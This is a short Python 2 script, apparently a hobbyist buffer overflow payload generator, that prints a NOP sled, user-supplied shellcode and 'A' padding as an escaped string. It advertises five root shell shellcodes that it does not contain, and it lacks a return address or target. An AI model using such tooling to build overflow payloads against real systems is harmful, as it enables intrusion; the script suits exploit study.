print("WELCOME TO THE BUFFER OVERFLOW PAYLOAD GENERATOR MADE BY MR.PAVITRA JHA") 
print("We have five shell codes for getting a root shell we can copy and past one of them or if you want you can use your own shellcode.")
shellcode = raw_input('''--root(Shellcode)kali
|__# ''')
_12 = raw_input("Num of pading-)#( ")
pad = r"\x41" * int(_12)
Nop = r"\x90" * 100
print("your payload: " + Nop + shellcode + pad + "    :now your payload is ready!!")

